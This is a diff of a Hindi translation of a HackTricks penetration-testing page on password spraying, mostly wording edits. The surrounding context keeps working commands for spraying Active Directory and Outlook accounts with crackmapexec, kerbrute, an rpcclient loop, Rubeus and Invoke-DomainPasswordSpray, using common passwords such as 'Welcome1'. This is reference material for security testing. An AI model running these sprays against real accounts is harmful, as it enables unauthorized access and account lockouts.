@@ -2,14 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 ## **Password Spraying**
 
-एक बार जब आप कई **मान्य उपयोगकर्ता नाम** ढूंढ लेते हैं, तो आप प्रत्येक खोजे गए उपयोगकर्ता के साथ सबसे **सामान्य पासवर्ड** आजमा सकते हैं (पर्यावरण की पासवर्ड नीति को ध्यान में रखें)।\
+एक बार जब आप कई **मान्य उपयोगकर्ता नाम** ढूंढ लेते हैं, तो आप प्रत्येक खोजे गए उपयोगकर्ता के साथ सबसे **सामान्य पासवर्ड** आज़मा सकते हैं (पर्यावरण की पासवर्ड नीति को ध्यान में रखें)।\
 **डिफ़ॉल्ट** रूप से **न्यूनतम** **पासवर्ड** **लंबाई** **7** है।
 
 सामान्य उपयोगकर्ता नामों की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-ध्यान दें कि आप **कुछ खातों को लॉक कर सकते हैं यदि आप कई गलत पासवर्ड आजमाते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।
+ध्यान दें कि यदि आप कई गलत पासवर्ड आज़माते हैं तो आप **कुछ खातों को लॉक कर सकते हैं** (डिफ़ॉल्ट रूप से 10 से अधिक)।
 
 ### Get password policy
 
@@ -30,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Linux से शोषण (या सभी)
+### Linux (या सभी) से शोषण
 
 - **crackmapexec** का उपयोग करते हुए:
 ```bash
@@ -55,7 +56,7 @@ spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- **Metasploit** के `scanner/smb/smb_login` मॉड्यूल के साथ:
+- `scanner/smb/smb_login` मॉड्यूल के साथ **Metasploit**:
 
 ![](<../../images/image (745).png>)
 
@@ -66,9 +67,9 @@ for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Windows से
+#### From Windows
 
-- [Rubeus](https://github.com/Zer1t0/Rubeus) के ब्रूट मॉड्यूल के साथ संस्करण:
+- With [Rubeus](https://github.com/Zer1t0/Rubeus) संस्करण जिसमें ब्रूट मॉड्यूल है:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,7 +78,7 @@ done
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
 - [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड नीति प्राप्त करेगा और इसके अनुसार प्रयासों को सीमित करेगा):
-```powershell
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) के साथ
@@ -90,11 +91,11 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 ```
 ## Outlook Web Access
 
-p**assword spraying outlook** के लिए कई उपकरण हैं।
+Outlook के लिए कई उपकरण हैं p**assword spraying**.
 
 - With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
 - with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- With [Ruler](https://github.com/sensepost/ruler) (विश्वसनीय!)
+- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
 - With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
